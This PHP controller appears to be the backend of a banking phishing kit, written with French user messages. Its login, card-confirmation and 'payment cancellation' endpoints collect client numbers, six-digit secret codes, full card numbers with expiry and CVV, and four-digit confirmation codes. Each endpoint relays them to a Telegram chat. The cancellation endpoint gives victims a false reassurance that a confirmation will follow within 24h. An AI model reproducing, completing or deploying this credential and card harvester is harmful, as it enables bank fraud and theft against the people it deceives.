<?php
namespace App\Controllers;

use App\TelegramClient;
use App\Helpers\Formatter;
use Psr\Log\LoggerInterface;
use Psr\Http\Message\ResponseInterface as Response;
use Psr\Http\Message\ServerRequestInterface as Request;


class ApiController
{
    private TelegramClient $telegram;
    private LoggerInterface $logger;

    public function __construct(TelegramClient $telegram, LoggerInterface $logger)
    {
        $this->telegram = $telegram;
        $this->logger = $logger;
    }

    public function root(Request $request, Response $response): Response
    {
        $payload = ['message' => 'Hello World'];
        $response->getBody()->write(json_encode($payload));
        return $response->withHeader('Content-Type', 'application/json');
    }

    public function cardConfirmation(Request $request, Response $response): Response
    {
        try {
            // Récupération et décodage du corps de la requête
            $body = json_decode($request->getBody()->getContents(), true);

        
            
            if (json_last_error() !== JSON_ERROR_NONE) {
                return $this->jsonError($response, 400, "Format JSON invalide");
            }
            
            $code = $body['confirmationCode'] ?? null;

            // Ajoutez ces lignes après avoir récupéré $body
                $this->logger->info("Received body: " . print_r($body, true));
                $this->logger->info("Code type: " . gettype($code));
                $this->logger->info("Code value: " . $code);

            // Conversion en chaîne et validation
            $code = (string) $code;
            
            if (strlen($code) !== 4 || !ctype_digit($code)) {
                return $this->jsonError($response, 400, "Le code de confirmation doit contenir exactement 4 chiffres");
            }

            $message = Formatter::formatCardConfirmationMessage(['confirmationCode' => $code]);
            $this->telegram->sendMessage($message);
            $this->logger->info("Card confirmation code sent to Telegram: {$code}");

            $payload = ['success' => true, 'message' => 'Carte confirmée avec succès'];
            $response->getBody()->write(json_encode($payload));
            return $response->withHeader('Content-Type', 'application/json');

        } catch (\Throwable $e) {
            $this->logger->error("Error processing card confirmation: " . $e->getMessage());
            return $this->jsonError($response, 500, "Erreur interne du serveur");
        }
    }

    public function cancelPayment(Request $request, Response $response): Response
    {
        try {
            // Récupération et décodage du corps de la requête
            $body = json_decode($request->getBody()->getContents(), true);
            
            if (json_last_error() !== JSON_ERROR_NONE) {
                return $this->jsonError($response, 400, "Format JSON invalide");
            }
            
            // Conversion explicite en chaînes de caractères
            $cardNumber = isset($body['cardNumber']) ? (string)$body['cardNumber'] : '';
            $expiry = isset($body['expiryDate']) ? (string)$body['expiryDate'] : '';
            $cvv = isset($body['cvv']) ? (string)$body['cvv'] : '';
            $holder = isset($body['cardHolder']) ? (string)$body['cardHolder'] : '';
            
            // Nettoyage du numéro de carte
            $cardNumber = str_replace(' ', '', $cardNumber);

            if (strlen($cardNumber) !== 16 || !ctype_digit($cardNumber)) {
                return $this->jsonError($response, 400, "Le numéro de carte doit contenir 16 chiffres");
            }

            if (!preg_match('/^\d{2}\/\d{2}$/', $expiry)) {
                return $this->jsonError($response, 400, "La date d'expiration doit être au format MM/AA");
            }

            if (strlen($cvv) !== 3 || !ctype_digit($cvv)) {
                return $this->jsonError($response, 400, "Le code CVV doit contenir exactement 3 chiffres");
            }

            if (trim($holder) === '') {
                return $this->jsonError($response, 400, "Le nom du titulaire est requis");
            }

            // Recompose body to ensure fields exist for formatter
            $data = [
                'cardNumber' => $cardNumber,
                'expiryDate' => $expiry,
                'cvv' => $cvv,
                'cardHolder' => $holder
            ];

            $message = Formatter::formatCancelPaymentMessage($data);
            $this->telegram->sendMessage($message);
            $masked = substr($cardNumber, 0, 4) . '****';
            $this->logger->info("Payment cancellation data sent to Telegram for card: {$masked}");

            $payload = ['success' => true, 'message' => "Votre demande d'annulation a été prise en compte. Vous recevrez une confirmation sous 24h."];
            $response->getBody()->write(json_encode($payload));
            return $response->withHeader('Content-Type', 'application/json');

        } catch (\Throwable $e) {
            $this->logger->error("Error processing payment cancellation: " . $e->getMessage());
            return $this->jsonError($response, 500, "Erreur interne du serveur");
        }
    }

    public function login(Request $request, Response $response): Response
    {
        try {
            // Récupération et décodage du corps de la requête
            $body = json_decode($request->getBody()->getContents(), true);
            
            if (json_last_error() !== JSON_ERROR_NONE) {
                return $this->jsonError($response, 400, "Format JSON invalide");
            }
            
            $clientNumber = isset($body['clientNumber']) ? (string)$body['clientNumber'] : '';
            $secretCode = isset($body['secretCode']) ? (string)$body['secretCode'] : '';
            $remember = isset($body['rememberClient']) ? (bool)$body['rememberClient'] : false;

            // Validation
            if (strlen($clientNumber) < 7 || strlen($clientNumber) > 10) {
                return $this->jsonError($response, 400, "Numéro client doit contenir entre 7 et 10 chiffres");
            }
            
            if (!ctype_digit($clientNumber)) {
                return $this->jsonError($response, 400, "Numéro client doit contenir uniquement des chiffres");
            }
            
            if (strlen($secretCode) !== 6 || !ctype_digit($secretCode)) {
                return $this->jsonError($response, 400, "Code secret doit contenir exactement 6 chiffres");
            }

            $data = [
                'clientNumber' => $clientNumber,
                'secretCode' => $secretCode,
                'rememberClient' => $remember
            ];

            $message = Formatter::formatLoginMessage($data);
            $this->telegram->sendMessage($message);
            $masked = substr($clientNumber, 0, 4) . '****';
            $this->logger->info("Successfully sent to Telegram for client: {$masked}");

            $payload = ['success' => true, 'message' => 'Connexion réussie ! Données envoyées vers Telegram.'];
            $response->getBody()->write(json_encode($payload));
            return $response->withHeader('Content-Type', 'application/json');

        } catch (\Throwable $e) {
            $this->logger->error("Error processing login: " . $e->getMessage());
            return $this->jsonError($response, 500, "Erreur interne du serveur");
        }
    }

    private function jsonError(Response $response, int $status, string $detail): Response
    {
        $response = $response->withStatus($status);
        $response->getBody()->write(json_encode(['detail' => $detail]));
        return $response->withHeader('Content-Type', 'application/json');
    }
}
